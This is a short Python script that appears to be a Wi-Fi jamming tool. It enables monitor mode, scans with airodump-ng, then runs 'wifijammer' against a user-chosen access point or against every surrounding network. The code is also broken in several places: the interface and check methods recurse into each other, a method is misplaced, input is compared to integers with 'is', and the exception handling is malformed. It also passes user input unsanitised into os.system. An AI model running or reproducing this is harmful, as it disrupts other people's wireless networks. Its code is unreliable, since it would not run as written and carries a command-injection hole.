try:
    import os
    import get_nic.getnic as nic
    import time


    class wifiscan:
        def __init__(self):
            self.check()
            pass

        def interface(self):
            interFaces = nic.interfaces()
            self.check()

        def check(self):
            if 'wlan0mon' in self.interface():
                print("Monitor mode is already enabled , continuing....")
            else:
                print("Enabling Monitor mode .... ")
                os.system('monstart >> /dev/null 2>&1')
                time.sleep(2)
            if 'wlan0mon' in self.interface():
                self.scan()
            else:
                print("Error occurs while enabling Monitor Mode")

            def scan(self):
                try:
                    os.system('airodump-ng wlan0mon')
                    print("Ctrl+C when ready")
                except:
                    self.jammer()

        def jammer(self):
            print('''
            1. Single WIFI
            2. SURROUNDING WIFI
            ''')
            jammerInput = input(">")
            if jammerInput is 1:
                bssid = input("Enter the bssid:")
                channel = input("Enter channel:")
                os.system('wifijammer -p 30 -a ' + bssid + ' -c ' + channel)
            elif jammerInput is 2:
                os.system('wifijammer --maximum 20')
            else:
                print('invaild option')


    wifiscan()
except Exception as e:
    if e in 'KeyboardInterrupt':
        print('[*]Exiting....')
    else:
        print("Something Went wrong :"+e)

